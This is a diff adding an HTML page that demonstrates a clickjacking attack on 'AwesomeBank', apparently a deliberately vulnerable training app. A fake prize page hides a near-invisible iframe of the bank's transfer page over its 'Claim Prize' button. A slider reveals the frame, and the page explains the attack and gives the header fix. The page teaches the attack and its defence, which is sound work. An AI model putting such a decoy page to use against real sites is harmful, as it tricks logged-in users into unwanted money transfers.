@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Win a Prize! — Totally Legit Site</title>
+  <style>
+    /* =========================================================
+       Clickjacking Demo (A05 — Security Misconfiguration)
+       =========================================================
+       This page demonstrates a clickjacking attack.
+       Because AwesomeBank does NOT set the X-Frame-Options or
+       Content-Security-Policy: frame-ancestors header, its pages
+       can be embedded in a cross-origin iframe.
+
+       The attacker overlays an invisible iframe containing the
+       banking app over a decoy button. When the victim clicks
+       what appears to be a harmless "Claim Prize" button they
+       are actually clicking a button inside the banking app
+       (e.g., "Confirm Transfer").
+
+       To see the attack:
+         1. Open this page while logged into AwesomeBank.
+         2. Slide the opacity slider to reveal the hidden iframe.
+         3. Observe that the bank UI sits directly under the decoy.
+    ========================================================= */
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3a5f, #2d6a4f);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+    }
+
+    .decoy-page {
+      text-align: center;
+      padding: 40px;
+      position: relative;
+      width: 100%;
+      max-width: 700px;
+    }
+
+    .decoy-page h1 {
+      font-size: 2.4rem;
+      margin-bottom: 12px;
+      color: #ffd700;
+      text-shadow: 0 2px 8px rgba(0,0,0,0.4);
+    }
+
+    .decoy-page p {
+      font-size: 1.1rem;
+      margin-bottom: 32px;
+      opacity: 0.9;
+    }
+
+    /* The attack container — iframe sits on top of the button */
+    .clickjack-container {
+      position: relative;
+      display: inline-block;
+    }
+
+    /* Decoy button — the victim sees this */
+    .decoy-btn {
+      display: inline-block;
+      padding: 18px 60px;
+      background: linear-gradient(135deg, #f59e0b, #d97706);
+      color: #1a1a1a;
+      font-size: 1.2rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      box-shadow: 0 4px 20px rgba(245,158,11,0.5);
+      transition: transform 0.1s;
+      position: relative;
+      z-index: 1;
+    }
+
+    .decoy-btn:hover { transform: scale(1.04); }
+
+    /* The malicious iframe — overlaid, nearly invisible */
+    .evil-iframe {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.01;       /* near-invisible to victim */
+      z-index: 2;          /* sits above the decoy button */
+      border: none;
+      pointer-events: all;
+    }
+
+    /* Debug controls — for the demo only */
+    .debug-panel {
+      margin-top: 40px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: left;
+    }
+
+    .debug-panel h3 { margin-bottom: 12px; font-size: 1rem; color: #ffd700; }
+
+    .debug-panel label { font-size: 0.9rem; display: block; margin-bottom: 8px; }
+
+    .debug-panel input[type=range] { width: 100%; margin-bottom: 16px; }
+
+    .debug-panel code {
+      display: block;
+      background: rgba(0,0,0,0.4);
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 0.82rem;
+      line-height: 1.6;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="decoy-page">
+    <h1>You've Won a Prize!</h1>
+    <p>Congratulations! You have been selected for an exclusive reward.<br>
+       Click the button below to claim your $1,000 gift card instantly!</p>
+
+    <div class="clickjack-container" id="attack-container">
+      <!-- Decoy: what the victim sees -->
+      <button class="decoy-btn" id="decoy-btn">
+        &#127873; Claim Your Prize Now!
+      </button>
+
+      <!-- The actual bank page embedded invisibly on top -->
+      <iframe
+        class="evil-iframe"
+        id="evil-frame"
+        src="moneyTransfer.html"
+        title="hidden frame">
+      </iframe>
+    </div>
+
+    <!-- Debug / Education Panel -->
+    <div class="debug-panel">
+      <h3>&#128270; Clickjacking Demo Controls</h3>
+
+      <label>
+        Iframe opacity: <span id="opacity-label">0.01 (nearly invisible — victim sees only decoy)</span>
+        <input type="range" min="0" max="100" value="1" id="opacity-slider"
+               oninput="updateOpacity(this.value)">
+      </label>
+
+      <p style="font-size:0.85rem;opacity:0.8;margin-bottom:12px;">
+        Slide right to reveal the hidden iframe. At 100% you can see the real banking
+        page sitting underneath the "Claim Prize" button. The iframe is scrolled and
+        positioned so a sensitive action (e.g., Transfer button) lines up with the decoy.
+      </p>
+
+      <code>Attack explanation:
+1. Victim visits this page while logged into AwesomeBank.
+2. AwesomeBank does NOT set X-Frame-Options or CSP frame-ancestors.
+3. This page embeds moneyTransfer.html in an invisible iframe (z-index: 2).
+4. The iframe is positioned so a sensitive UI element overlaps the decoy button.
+5. Victim clicks "Claim Prize" — actually clicks inside the banking iframe.
+6. The browser sends the victim's cookies/session with the framed request.
+
+Fix: Add to every PHP response header:
+  header("X-Frame-Options: DENY");
+  header("Content-Security-Policy: frame-ancestors 'none'");</code>
+    </div>
+  </div>
+
+  <script>
+    function updateOpacity(val) {
+      const frame = document.getElementById('evil-frame');
+      const label = document.getElementById('opacity-label');
+      const opacity = (val / 100).toFixed(2);
+      frame.style.opacity = opacity;
+
+      if (val < 5) {
+        label.textContent = `${opacity} (nearly invisible — victim sees only decoy)`;
+      } else if (val < 50) {
+        label.textContent = `${opacity} (semi-transparent — attack partially visible)`;
+      } else {
+        label.textContent = `${opacity} (fully visible — revealing the hidden bank iframe)`;
+      }
+    }
+  </script>
+</body>
+</html>
